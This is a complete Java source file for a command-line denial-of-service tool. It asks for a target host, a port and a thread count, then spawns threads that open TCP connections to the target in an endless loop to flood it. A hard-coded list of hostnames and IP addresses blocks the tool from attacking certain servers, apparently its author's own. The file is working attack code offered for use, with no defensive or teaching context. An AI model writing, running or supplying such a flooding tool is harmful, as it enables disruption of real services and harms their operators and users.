package tools;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.Socket;
import java.net.UnknownHostException;

public class Dos extends Socket implements Runnable {
    private static Dos instance = new Dos();
    public static String target = "";
    public static int port = 80;
    public static int count = 0;
    private static final String tosend = "";

    public static void main(String args[]) {

        System.out.println("Please input the IP/Domain of the target you would like to ddos :::");
        int retry1 = 0;
        while (retry1 == 0) {
            try {
                target = System.console().readLine();
                if (target.contains("kryptodev") || target.contains("destinyms") || target.contains("89.18.189.189") || target.contains("91.214.44.30") || target.contains("69.163.44.74") || target.contains("smexy.myftp.org")) {
                    retry1 = 0;
                    System.out.println("Invalid input. Please re-enter.");
                } else {
                    retry1 = 1;
                }
            } catch (Exception e) {
                System.out.println("Invalid input. Please re-enter.");
            }
        }

        System.out.println("Please input the port of the target you would like to ddos [Default = 80");
        int retry2 = 0;
        while (retry2 == 0) {
            try {
                port = Integer.parseInt(System.console().readLine());
                retry2 = 1;
            } catch (Exception e) {
                System.out.println("Invalid input. Please re-enter.");
            }
        }

        System.out.println("Please input the number of instance you would like to create :::");
        int retry3 = 0;
        int times = 0;
        while (retry3 == 0) {
            try {
                times = Integer.parseInt(System.console().readLine());
                retry3 = 1;
            } catch (Exception e) {
                System.out.println("Invalid input. Please re-enter.");
            }
        }

        System.out.println("Starting instances.");
        for (int i = 0; i < times; i++) {
            new Thread(instance).start();
            count++;
            System.out.println("Instance #" + i + " started.");
        }
    }

    public void run() {
        while (true) {
            try {
                final BufferedWriter out = new BufferedWriter(new OutputStreamWriter(new Socket(target, port).getOutputStream()));
                out.write(tosend);
                out.flush();
            } catch (ConnectException ce) {
                System.out.println("Connection exception occured, retrying.");
            } catch (UnknownHostException e) {
                System.out.println("DDoS.run: " + e);
            } catch (IOException e) {
                System.out.println("DDoS.run: " + e);
            }
        }
    }
}
